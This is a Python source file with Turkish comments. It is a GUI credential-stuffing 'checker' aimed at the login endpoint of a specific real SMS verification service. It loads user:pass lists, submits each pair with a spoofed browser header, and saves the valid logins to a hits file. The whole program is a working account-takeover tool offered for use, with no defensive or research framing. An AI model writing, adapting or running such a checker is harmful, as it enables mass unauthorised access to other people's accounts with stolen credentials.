import requests
import tkinter as tk
from tkinter import messagebox, filedialog, ttk
import threading
import random
import math
import os

# === DOSYA AYARLARI ===
HITS_FILE = "hits.txt"
FAILS_FILE = "fails.txt"

class SMSOnayChecker:
    def __init__(self):
        self.accounts = []
        self.running = False
        self.hits = 0
        self.fails = 0

    def load_file(self):
        # DAYI İSTEDİĞİN BUTON BURASI: .txt dosyasını buradan seçiyorsun
        file_path = filedialog.askopenfilename(
            title="Hesap Listesini Seç (USER:PASS)", 
            filetypes=[("Text files", "*.txt")]
        )
        if file_path:
            with open(file_path, "r", encoding="utf-8") as f:
                # Satırları temizle ve boş olmayanları al
                self.accounts = [line.strip() for line in f if ":" in line]
            messagebox.showinfo("Sistem", f"Tamamdır Dayı! {len(self.accounts)} hesap yüklendi.")
            status_label.config(text=f"Hazır: {len(self.accounts)} hesap yüklendi.", fg="#6366f1")

    def check_logic(self, email, password):
        url = "https://smsonay.app/panel/ajax/login"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*"
        }
        payload = {"email": email, "password": password}
        
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=8)
            res_text = response.text
            
            # KeyCheck Mantığı
            if '{"success":true,"' in res_text:
                return "SUCCESS"
            elif 'success":false' in res_text or 'Ba\\u015far\\u0131s\\u0131z' in res_text:
                return "FAILURE"
            return "ERROR"
        except:
            return "RETRY"

    def worker(self, log_func):
        for acc in self.accounts:
            if not self.running: break
            
            try:
                user, pwd = acc.split(":", 1)
                result = self.check_logic(user, pwd)
                
                if result == "SUCCESS":
                    self.hits += 1
                    with open(HITS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
                    log_func(f"[HIT] {user}", "#00ff00")
                else:
                    self.fails += 1
                    with open(FAILS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
                    log_func(f"[FAIL] {user}", "#ff4444")
                
                # İstatistikleri güncelle
                stats_label.config(text=f"HITS: {self.hits} | FAILS: {self.fails} | KALAN: {len(self.accounts)-(self.hits+self.fails)}")
            except:
                continue

        self.running = False
        messagebox.showinfo("Bitti", "Tüm hesaplar kontrol edildi dayı!")

# === UI VE TASARIM ===
def start_app():
    checker = SMSOnayChecker()
    root = tk.Tk()
    root.title("SMSOnay Checker - WASD Edition")
    root.geometry("850x650")
    root.configure(bg="#050505")

    # --- ARKA PLAN (AŞIRI YOĞUN WASD) ---
    canvas = tk.Canvas(root, bg="#050505", highlightthickness=0)
    canvas.place(relx=0, rely=0, relwidth=1, relheight=1)

    particles = []
    # 200 adet WASD yazısı - Her yerde uçuşacaklar
    for _ in range(200):
        size = random.randint(10, 26)
        p = canvas.create_text(random.randint(0, 850), random.randint(0, 650),
                               text="WASD", font=("Arial", size, "bold"),
                               fill=random.choice(["#111", "#181818", "#222"]))
        particles.append([p, random.uniform(-0.6, 0.6), random.uniform(-1.0, -0.4)])

    def animate():
        mx, my = root.winfo_pointerx() - root.winfo_rootx(), root.winfo_pointery() - root.winfo_rooty()
        for p in particles:
            canvas.move(p[0], p[1], p[2])
            pos = canvas.coords(p[0])
            if pos:
                dist = math.sqrt((pos[0]-mx)**2 + (pos[1]-my)**2)
                if dist < 130: # Fare yaklaştığında it
                    canvas.move(p[0], (pos[0]-mx)/8, (pos[1]-my)/8)
                if pos[1] < -30: # Yukarı çıkarsa aşağıdan başlat
                    canvas.coords(p[0], random.randint(0, 850), 680)
        canvas.tag_lower("all")
        root.after(20, animate)

    # --- ANA PANEL ---
    main_frame = tk.Frame(root, bg="#0e0e0e", bd=1)
    main_frame.place(relx=0.5, rely=0.5, anchor="center", width=700, height=500)

    tk.Label(main_frame, text="SMSONAY ACCOUNT CHECKER", fg="#6366f1", bg="#0e0e0e", font=("Arial", 16, "bold")).pack(pady=15)

    global stats_label, status_label
    status_label = tk.Label(main_frame, text="Lütfen hesap listesini yükleyin...", fg="#555", bg="#0e0e0e", font=("Arial", 9))
    status_label.pack()

    stats_label = tk.Label(main_frame, text="HITS: 0 | FAILS: 0 | KALAN: 0", fg="white", bg="#0e0e0e", font=("Arial", 11, "bold"))
    stats_label.pack(pady=10)

    # Console / Log Alanı
    console = tk.Text(main_frame, bg="#050505", fg="#888", font=("Consolas", 10), relief="flat", state="disabled", borderwidth=0)
    console.pack(padx=30, pady=10, fill="both", expand=True)

    def log_to_console(text, color):
        console.config(state="normal")
        console.insert("end", text + "\n", color)
        console.tag_config(color, foreground=color)
        console.see("end")
        console.config(state="disabled")

    # BUTONLAR
    btn_container = tk.Frame(main_frame, bg="#0e0e0e")
    btn_container.pack(pady=20)

    def start_thread():
        if not checker.accounts:
            messagebox.showwarning("Hata", "Dayı önce listeyi yükle!")
            return
        if checker.running: return
        checker.running = True
        log_to_console(">>> İşlem Başlatıldı...", "#6366f1")
        threading.Thread(target=checker.worker, args=(log_to_console,), daemon=True).start()

    # Dayı işte o istediğin butonlar:
    tk.Button(btn_container, text="LİSTE YÜKLE (.txt)", bg="#252525", fg="white", relief="flat", width=20, command=checker.load_file, cursor="hand2").pack(side="left", padx=10, ipady=7)
    tk.Button(btn_container, text="BAŞLAT", bg="#6366f1", fg="white", relief="flat", width=15, command=start_thread, cursor="hand2").pack(side="left", padx=10, ipady=7)
    tk.Button(btn_container, text="DURDUR", bg="#ef4444", fg="white", relief="flat", width=15, command=lambda: setattr(checker, 'running', False), cursor="hand2").pack(side="left", padx=10, ipady=7)

    animate()
    root.mainloop()

if __name__ == "__main__":
    start_app()
